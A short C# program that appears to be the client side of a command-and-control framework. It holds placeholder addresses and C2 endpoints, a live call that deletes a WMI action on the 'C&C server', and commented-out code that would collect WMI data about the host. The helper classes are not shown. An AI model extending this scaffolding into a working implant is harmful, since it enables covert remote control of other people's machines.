using System;
using System.Collections.Generic;
using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Threading.Tasks;
using Newtonsoft.Json;

namespace WMInteraction
{
    class Program
    {
        static void Main(string[] args)
        {
            string wmiActionIdDelete = "10";
            string client_id = "1236";
            string ipAddress = "10.10.10.10";
            string platform = "windows";
            string c2Uri = "/api/clients/1236/action_status";
            string username = "username";

            // Retrive WMI information about client
            /*
             * HTTPClient httpClient = new HTTPClient(client_id, ipAddress, username, platform, c2Uri);
             * HTTPClient.RunAsync(dynamicWMI, httpClient).GetAwaiter().GetResult();
             * Dictionary<string, Object> wmiProperties = dynamicWMI.RetriveWMIData();
             * foreach (KeyValuePair<string, Object> entry in wmiProperties
             * {
             *      Console.WriteLine("Key: {0} | Value: {1}", entry.Key, entry.Value);
             * }
             * 
            */


            // Delete Command from C&C server
            c2Uri = "/api/delete_wmi_action_to_user";

            WMI_component dynamicWMI = new WMI_component("", "", "", wmiActionIdDelete);
            HTTPClient httpClient = new HTTPClient(client_id, ipAddress, username, platform, c2Uri);

            HTTPClient.DeleteCommand(dynamicWMI, httpClient).GetAwaiter().GetResult();

        }
    }
}
